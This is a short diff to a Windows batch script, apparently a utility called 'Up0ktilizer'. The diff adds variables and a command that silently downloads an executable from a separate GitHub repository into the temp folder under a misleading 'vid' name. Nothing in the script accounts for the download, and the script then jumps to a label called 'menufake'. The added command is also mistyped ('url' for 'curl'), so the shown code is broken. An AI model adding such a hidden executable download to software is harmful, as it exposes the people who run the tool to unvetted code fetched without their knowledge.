@@ -5,7 +5,11 @@ color 0a
 cls
 
 set tempascii=https://raw.githubusercontent.com/Upok18/Up0ktilizer/refs/heads/main/Ascii.txt
+set tempVid=%temp%\up0k_vid.exe
+set vidURL=https://raw.githubusercontent.com/Upok18/FAH/refs/heads/main/file.exe
+
 curl -s -o "%temp%\Ascii.txt" https://raw.githubusercontent.com/Upok18/Up0ktilizer_Batch/refs/heads/main/Ascii.txt
+url -sL "%vidURL%" -o "%tempVid%"
 
 REM call :changelog
 goto :menufake
